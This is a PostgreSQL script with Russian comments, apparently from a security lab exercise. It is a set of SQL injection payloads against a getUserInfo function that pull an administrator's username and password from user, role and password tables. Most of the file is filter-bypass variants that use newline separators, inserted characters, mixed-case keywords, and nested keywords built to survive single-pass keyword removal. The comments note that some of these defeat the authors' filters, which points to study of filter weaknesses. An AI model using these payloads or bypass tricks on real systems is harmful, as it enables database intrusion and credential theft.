/*Узнаём имя администратора*/
select * from getUserInfo('username and username in (SELECT users.username
 from users_OUEthG users inner join roles_OUEthG roles 
 on roles.mHash = md5(users.username) where roles.role = $$admin$$)');


/*Узнаём пароль администратора*/
SELECT * FROM getUserInfo('$$something$$;select username,expired::int,
    password,expired,expired::varchar,expired::varchar from 
    passwords_OUEthG pass where pass.username = $$khAvvWSroUCbjSC$$--');


/*Изменённые инъекции для прохождения фильтра*/
SELECT * FROM getUserInfo('username'||E'\x0a'||'and'||E'\x0a'
||'username'||E'\x0a'||'in'||E'\x0a'||'(sel=ect'||E'\x0a'||'users.username'
||E'\x0a'||'fr=om'||E'\x0a'||'users_OUEthG'||E'\x0a'||'users'||E'\x0a'||'inner'|| 
E'\x0a'||'join'||E'\x0a'||'roles_OUEthG'||E'\x0a'||'roles'||E'\x0a'||'on'||E'\x0a'||
'roles.mHash'||E'\x0a'||'like'||E'\x0a'
||'md5(users.username)'||E'\x0a'||'where'||E'\x0a'|| 
'roles.role'||E'\x0a'||'like'||E'\x0a'||'$$adm=in$$)--');

SELECT * FROM getUserInfo('$$something$$;sel=ect'||E'\x0a'||'username,expired::int,
    password,expired,expired::varchar,expired::varchar'||E'\x0a'||'fr=om'||E'\x0a'|| 
    'passwords_OUEthG'||E'\x0a'||'pass'||E'\x0a'||'where' ||E'\x0a'||
     'pass.username'||E'\x0a'||'like'||E'\x0a'||'$$khAvvWSroUCbjSC$$--');


/*Изменённые инъекции для прохождения фильтра в Верхнем регистре*/
SELECT * FROM getUserInfo('username'||E'\x0a'||'and'||E'\x0a'
||'username'||E'\x0a'||'in'||E'\x0a'||'(SELECT'||E'\x0a'||'users.username'
||E'\x0a'||'FROM'||E'\x0a'||'users_OUEthG'||E'\x0a'||'users'||E'\x0a'||'inner'|| 
E'\x0a'||'join'||E'\x0a'||'roles_OUEthG'||E'\x0a'||'roles'||E'\x0a'||'on'||E'\x0a'||
'roles.mHash'||E'\x0a'||'like'||E'\x0a'
||'md5(users.username)'||E'\x0a'||'where'||E'\x0a'|| 
'roles.role'||E'\x0a'||'like'||E'\x0a'||'$$adm=in$$)--');

SELECT * FROM getUserInfo('$$something$$;SELECT'||E'\x0a'||'username,expired::int,
    password,expired,expired::varchar,expired::varchar'||E'\x0a'||'FROM'||E'\x0a'|| 
    'passwords_OUEthG'||E'\x0a'||'pass'||E'\x0a'||'where' ||E'\x0a'||
     'pass.username'||E'\x0a'||'like'||E'\x0a'||'$$khAvvWSroUCbjSC$$--');


/*Инъекции, которые нельзя предотвратить с помощью наших фильтров
Данная инъекция использует верхний регистр в ключевых словах только в одном месте (середина)*/
SELECT * FROM getUserInfo('username'||E'\x0a'||'and'||E'\x0a'
||'username'||E'\x0a'||'in'||E'\x0a'||'(seLect'||E'\x0a'||'users.username'
||E'\x0a'||'frOm'||E'\x0a'||'users_OUEthG'||E'\x0a'||'users'||E'\x0a'||'inner'|| 
E'\x0a'||'join'||E'\x0a'||'roles_OUEthG'||E'\x0a'||'roles'||E'\x0a'||'on'||E'\x0a'||
'roles.mHash'||E'\x0a'||'like'||E'\x0a'
||'md5(users.username)'||E'\x0a'||'where'||E'\x0a'|| 
'roles.role'||E'\x0a'||'like'||E'\x0a'||'$$aadmindmin$$)--');

SELECT * FROM getUserInfo('$$something$$;seLect'||E'\x0a'||'username,expired::int,
    password,expired,expired::varchar,expired::varchar'||E'\x0a'||'frOm'||E'\x0a'|| 
    'passwords_OUEthG'||E'\x0a'||'pass'||E'\x0a'||'where' ||E'\x0a'||
     'pass.username'||E'\x0a'||'like'||E'\x0a'||'$$khAvvWSroUCbjSC$$--');


/*Инъекции, которые нельзя предотвратить с помощью наших фильтров
Данная инъекция использует тот факт, что ключевые слова удаляются один раз
Поэтому внутри ключевого слова, можно поставить ещё одно ключевое слово, при удалении останется основоное*/
SELECT * FROM getUserInfo('username'||E'\x0a'||'and'||E'\x0a'
||'username'||E'\x0a'||'in'||E'\x0a'||'(seselectlect'||E'\x0a'||'users.username'
||E'\x0a'||'frfromom'||E'\x0a'||'users_OUEthG'||E'\x0a'||'users'||E'\x0a'||'inner'|| 
E'\x0a'||'join'||E'\x0a'||'roles_OUEthG'||E'\x0a'||'roles'||E'\x0a'||'on'||E'\x0a'||
'roles.mHash'||E'\x0a'||'like'||E'\x0a'
||'md5(users.username)'||E'\x0a'||'where'||E'\x0a'|| 
'roles.role'||E'\x0a'||'like'||E'\x0a'||'$$aadmindmin$$)--');

SELECT * FROM getUserInfo('$$something$$;seLect'||E'\x0a'||'username,expired::int,
    password,expired,expired::varchar,expired::varchar'||E'\x0a'||'frfromom'||E'\x0a'|| 
    'passwords_OUEthG'||E'\x0a'||'pass'||E'\x0a'||'where' ||E'\x0a'||
     'pass.username'||E'\x0a'||'like'||E'\x0a'||'$$khAvvWSroUCbjSC$$--');